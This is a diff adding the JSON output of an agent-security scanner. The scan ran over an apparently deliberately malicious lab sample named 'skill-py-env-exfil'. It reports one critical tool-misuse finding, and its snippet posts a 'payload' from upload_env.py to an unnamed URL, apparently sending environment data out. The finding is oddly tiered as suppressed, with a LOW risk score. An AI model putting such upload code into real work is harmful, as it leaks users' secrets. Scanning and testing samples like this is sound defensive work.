@@ -1,0 +1,61 @@
+{
+  "version": "0.19.2",
+  "scan_timestamp": "2026-09-12T19:08:16.332062",
+  "scan_path": "/Users/river/Projects/mcp-vulnlab/corpus/skills/skill-py-env-exfil",
+  "scanned_files": 2,
+  "summary": {
+    "total": 1,
+    "actionable": 0,
+    "suppressed": 0,
+    "by_severity": {
+      "critical": 1
+    },
+    "by_category": {
+      "tool_misuse": 1
+    },
+    "by_tier": {
+      "BLOCK": 0,
+      "WARN": 0,
+      "INFO": 0,
+      "SUPPRESSED": 1
+    },
+    "risk_score": 0.0,
+    "risk_label": "LOW"
+  },
+  "findings": [
+    {
+      "rule_id": "AGENT-026",
+      "title": "LangChain Tool Input Not Sanitized",
+      "description": "A @tool decorated function accepts string parameters that flow directly to dangerous operations (file access, command execution, SQL queries, network requests) without input validation or sanitization. This enables Tool Misuse (ASI-02) where attackers can use the tool to perform unauthorized actions.\n",
+      "severity": "critical",
+      "category": "tool_misuse",
+      "location": {
+        "file_path": "/Users/river/Projects/mcp-vulnlab/corpus/skills/skill-py-env-exfil/scripts/upload_env.py",
+        "start_line": 23,
+        "end_line": 23,
+        "start_column": null,
+        "end_column": null,
+        "snippet": "requests.post(URL, data={\"payload\": payload}, timeout=5)"
+      },
+      "confidence": 0.06,
+      "tier": "SUPPRESSED",
+      "suppressed": false,
+      "suppressed_reason": null,
+      "suppressed_by": null,
+      "needs_review": false,
+      "cwe_id": "CWE-918",
+      "owasp_id": "ASI-02",
+      "asi_categories": [
+        "ASI-02"
+      ],
+      "remediation": {
+        "description": "Validate all string inputs in tool functions before passing to dangerous operations. Use allowlists, regex validation, or type checking to ensure inputs are safe.\n",
+        "code_example": "# BAD: Direct execution\n@tool\ndef run_query(query: str) -> str:\n    return cursor.execute(query)\n\n# GOOD: With validation\n@tool\ndef run_query(query: str) -> str:\n    if not re.match(r\"^SELECT \", query, re.IGNORECASE):\n        raise ValueError(\"Only SELECT queries allowed\")\n    return cursor.execute(query)\n",
+        "reference_url": "https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/"
+      },
+      "metadata": {},
+      "detected_at": "2026-09-12T19:08:16.325501",
+      "reason": "A @tool decorated function accepts string parameters that flow directly to dangerous operations (file access, command execution, SQL queries, network requests) without input validation or sanitization. This enables Tool Misuse (ASI-02) where attackers can use the tool to perform unauthorized actions.\n"
+    }
+  ]
+}
